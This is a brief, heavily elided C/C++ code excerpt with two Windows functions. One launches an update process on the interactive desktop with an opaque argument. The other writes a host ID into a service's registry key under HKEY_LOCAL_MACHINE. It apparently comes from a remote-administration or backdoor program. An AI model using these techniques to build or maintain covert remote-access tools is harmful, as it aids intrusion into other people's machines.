...
bool UpdateServer(LPCTSTR lpURL)
{
	...
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	return CreateProcess(lpFileName, "zwgx", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}
...
void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	...
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, szHost, REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
}
